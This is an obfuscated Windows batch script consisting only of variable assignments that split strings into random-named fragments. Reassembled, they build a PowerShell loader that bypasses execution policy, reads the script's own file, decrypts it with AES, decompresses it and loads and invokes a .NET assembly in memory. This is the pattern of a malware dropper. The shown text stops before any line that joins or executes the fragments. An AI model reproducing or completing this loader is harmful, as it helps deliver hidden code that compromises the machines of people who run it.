@echo off
set "SxzoZCCkDa=0\"
set "wLKjwARfjE= C"
set "VaQEWQWQwK=Wi"
set "UBwhxCaCjD=.e"
set "AjHtrtFQKh=rS"
set "xkYSiwIbOw=we"
set "iYQFnFHtbM=ow"
set "DbIyzWANqW=Sy"
set "uCdlaZWtGL=do"
set "BCCdhfJssO=he"
set "CpelQdiriW=rs"
set "zRDQTXjkqq=st"
set "jCOKwXCXKe=em"
set "eTdenwDneY=\W"
set "AHGizlHzuz=\v"
set "DwtROfauFc=:\"
set "VqpDWCPRdo=we"
set "lKQWxamYcC=in"
set "uoTLTlJZMj=Po"
set "qucYYhHFRi= /"
set "HReZlqzKwZ=ws"
set "DrrnoaeakR=co"
set "cakPSoBJaR=py"
set "IxWuHAfoZP=he"
set "xuIztIzGfD=ll"
set "EClFbhaOWf=y "
set "FToFItOmwR=1."
set "eHWGARGiQO=nd"
set "pXHwPrCAcJ=ll"
set "WAVjkhpsgq=32"
set "RfOaGTVtEW=po"
set "KElIoanDlI=xe"
set "oheYVvVgnG=s\"
set "bnnpbGnexw= %~dp0"
set "noqyjSDbsn=cd"
set "YZukhUQPpq=Obje"
set "RpSWsbZYOZ=abvZ"
set "pCGjrFAieS=Comp"
set "dmsnAWJFvX=-ep "
set "sKLPkmHOGh=[]] "
set "TutawYgQwt=ispo"
set "SFXdKubmzl=)($G"
set "CwHiQBNrEl=Syst"
set "weInAgwlaF=pose"
set "KXBZBPztog=$qyA"
set "VkqGPzNaXo=16] "
set "ctmQqKXBHY=);$x"
set "RyNNLTOtrG=grap"
set "AlYFWjpwmf=-1.."
set "kYxFLwbbvV=pher"
set "TLoWEJIhej=YxVw"
set "sAXZuAUWRk=Comp"
set "usyeulDoWY=th('"
set "ggsBNeTEaM=ert]"
set "DpktYvArBb=zuZI"
set "KpmHyJczrS=tryP"
set "zjMzmZgaOR=ose("
set "NIGgJPsoFo=.Con"
set "viqZVwDTWT=..-1"
set "uFnuGkCurs=]::N"
set "GxsOZtmCCx=pStr"
set "GXDJrIWJUc=$xsH"
set "rQbojccPbb===')"
set "ZVdjSbwTWK=nirt"
set "gCVlEkkyuu=1] -"
set "MMNSVoExkY=ect "
set "UWuYiGnrMu=  $x"
set "yAnNwfDhMF=:: '"
set "pYVqOYApYm=ew-O"
set "HbjJvDRTAx=Ngin"
set "cFKREwygJj=oL'["
set "sdkIEFKEKR=y]::"
set "uQsFlErOuZ==');"
set "rfhocyZceJ=();$"
set "MFkrHqAphd=oin "
set "frFZTnAnTP= '')"
set "eZIfOiAjtu=comm"
set "KuTszqMWTb=FpZ "
set "nrsyufbauh=PxEW"
set "ECveLvlPhm=trea"
set "MlTXYQZSvG= New"
set "gDUArHnuRG=n ''"
set "RTcRCmxQSg=jDdR"
set "GIOGkXLiyK=lit("
set "RTTSNRAjzf=[IO."
set "avjswEJqxx=::('"
set "RJOBaXkmmA=join"
set "zGBHTZefGL=BX ="
set "DLNwusagHg=[Sys"
set "GakqfOCuHq=New-"
set "UoSMVOXwkO=raph"
set "SZytPonjHC=in.I"
set "cuYdINPBcI=rt]:"
set "yRGOYToPbn=hy.A"
set "NRKnSzLjRV=PKCS"
set "QplHQqhyXH=oArr"
set "tvWqjbINOG=[Sys"
set "cdPrdgyJDZ=stem"
set "GmMeMOMPdO=).Sp"
set "SmZOPhckiG=('da"
set "HlTFHUYCCc=3); "
set "CmdsIHbsKk=Ngin"
set "MbtGevRjEM=]::("
set "xIaBBQgdui=Zabv"
set "IMMskWMHrz=m.IO"
set "TGYITMILuo=;$Ix"
set "OFmYQOanmz=;$Rh"
set "qVEsNgkOBJ=[-1."
set "xLjHNfTPro=tion"
set "kCXTPoHoao=gnir"
set "NGMshHKGoa=Obje"
set "TKfnJdWytN=dR ="
set "DhNsUvyNSN=($wS"
set "eiQNMUDOOc= '')"
set "XHhpcVRnby=BC;$"
set "QqbxLIXwjQ=RNr."
set "ysrFGSsIUz=d;$x"
set "pKbSUICstn=m.IO"
set "IhoSrtLgaP=ress"
set "iOKZvYGvKw=ment"
set "AknPYRwEBR=n ''"
set "wnNYYuxcdN=ss -"
set "DdXADCgWtv=zHhH"
set "uUubLODATi=l5E7"
set "NVapmTkuej=xNgi"
set "gXBYdcsRlW=();$"
set "DutvIewvpF=sion"
set "IXMsfmCdxj=null"
set "wQvqATpzZV= = N"
set "zRzDFFjfaS=Yhp "
set "gZqFELtPYX=RmAx"
set "SDbiCJtzMi=::De"
set "tuiAmAIUWw=;$Ut"
set "fnIbUcuHsE=ct S"
set "YRgmurYrdq= [st"
set "TBBdiEAjqr=tem."
set "mfNmGKEbAu=ress"
set "LlkoYVtWTg=comp"
set "MwGjRFFGtH= = ["
set "qsOIjVbfyM=, (,"
set "BtzlJMtsei=-joi"
set "LfXIQXIwlL=GjDd"
set "PhLsTqnKJe=ion."
set "vOqNWWJdlM=Syst"
set "olagBgApko=)))"
set "tVbcXKuTpZ=oryS"
set "gujpYqsumL=and "
set "IkRyyVajgx=ring"
set "LAfvnfqsCr=.Cre"
set "nJduJldDeJ=dR);"
set "AEccaYBHqM='gni"
set "oDWnDidqqK=6esa"
set "BZhzBSLKVN=ne);"
set "NyIQftsiwd=.Mem"
set "DygcDaoHVZ=g = "
set "KClVGtcmay=rity"
set "qbvIZcCTXG=ach "
set "AcneRUvvOJ=m(, "
set "VAyIQVmTes=RhFp"
set "HvcUtgNMen=('%~f0'"
set "YMkvUiisNH=bypa"
set "WmzJLSPbWT=vil "
set "RklmNjlGZO=R = "
set "LFBebldmRb=yste"
set "fyhysgbFwo=Nr, "
set "kCLKwiJiHD=y.Pa"
set "poKAVxeWRk=r = "
set "xChIEVNirE=y.Ci"
set "jAAOBCragG=);$Z"
set "mJRtuVUMhE=brea"
set "MjpAgGsUGD=$Ixv"
set "ytzGLbGJDk=em.C"
set "rirRizPhgn=tem."
set "qTmyXLbqcc=m.Re"
set "vQmOmEizMy=morF"
set "lBIxkcBChF=mory"
set "NEEqPYSukJ=]::("
set "AyMmWHrpeE== [S"
set "dTmrPFogSF=Uc);"
set "cjzgWYCpfk=Ngin"
set "PdmZfRIvPB=GjDd"
set "DQqQhXliHx=Stre"
set "RnKOFayacK=O.Me"
set "hREnMQRAXN=('%*'"
set "KgszXtrKSm=s75K"
set "uvbeOSMoet=gth)"
set "RiNzCxMUUg=ct S"
set "SxSfuasTru= if "
set "YMvgGSZHUj=Star"
set "WoXhSNgSFD=]::C"
set "qDlrvtOYfu=vZ.D"
set "jGwMehrPlG=orF'"
set "vaUSIhLNWj=jDdR"
set "LxHuhWMpkT=rans"
set "JzVliCPcAy=106u"
set "DdPmitTwWY=ptor"
set "TjPhRicCRy='0Pg"
set "ZGTEiwCSFD=Yhp."
set "STFsVQMhHL=eam("
set "AIFxxWgtVb=Secu"
set "qnBjzKQyTn=ptog"
set "GYfOfNtnTM=Z.En"
set "jgDwWPLfoK=$UtR"
set "RBnyeBfoFP=wSYh"
set "mlVBiiqvvU=yste"
set "MEluWWAbDA=.Cop"
set "ORBWsADrDE=join"
set "OpsEfHiuqc=New-"
set "HwpjMmucax=)) {"
set "iDajDrHWlc=$xsH"
set "FamcYEEHRL=embl"
set "SUSKdaDrwr=stem"
set "ExMqUHEWik='')("
set "ETSKGLnggq=ecry"
set "ynqTAjuAiC=.Sec"
set "oXyItxfmtB=PTtG"
set "TNBmJVOjYA=Invo"
set "DXYEDNwnRj=ing("
set "gBcMCvsZQX=tem."
set "VhtrOXtGhs=e]::"
set "UwJZyAgOJC=raph"
set "ZapLNsXZxP=:('g"
set "FchPLyGxeo=gMod"
set "pHEmvLpgat=GjDd"
set "MWGBqAcCZk=bstr"
set "ILkWPEjYQc=oint"
set "pSMpkFFDlv=qyAB"
set "VgSztaWTGH=Z = "
set "TkXmSkWRJj=pose"
set "LBIiucFwBC=urit"
set "UTQAjduvYX=S46e"
set "tYaVzsvChT=eMVs"
set "ipldmHNnjA=daeR"
set "RRqeBmTCDz=-Obj"
set "YBbADTniZd=.-16"
set "NRnqYSwMaY=iron"
set "ItuNuFuYxG=rity"
set "NtVgRiDSJN=fore"
set "hHUNPdByIk=ziwM"
set "jEHaIWbqMX=n.Pa"
set "xSWMonnLUJ=rtS4"
set "mfHVkOloaT=saBm"
set "GhNZCPhCaT= [Sy"
set "qivRYUvdJI=ddin"
set "FxvCKUYhbJ=;$Ix"
set "AmsyOmYVpw=t Sy"
set "zDoulTnQOC=k; }"
set "FKDWBvmiuV=R, 0"
set "jBbbvPppos=TllA"
set "AxCosBdaUw=; };"
set "kgDqQFBScH=.Com"
set "swUjAzRQhq=il.T"
set "KmvViYiORQ=bjec"
set "OSKjolQLhq=R = "
set "VIDxssbymQ=-4] "
set "oZeFjKPonr=Uc ="
set "vxBMIeoirY=stem"
set "fTsIExdbxC=, $G"
set "UZRjexpepr== $x"
set "PWseYrNdgK=);$G"
set "FnLwpkaslo=..-1"
set "DtPnoBcgHD=$xsH"
set "PuKziDcQlW=ddin"
set "PYDjzssKdw=.Mod"
set "QLSxkGOMSy=form"
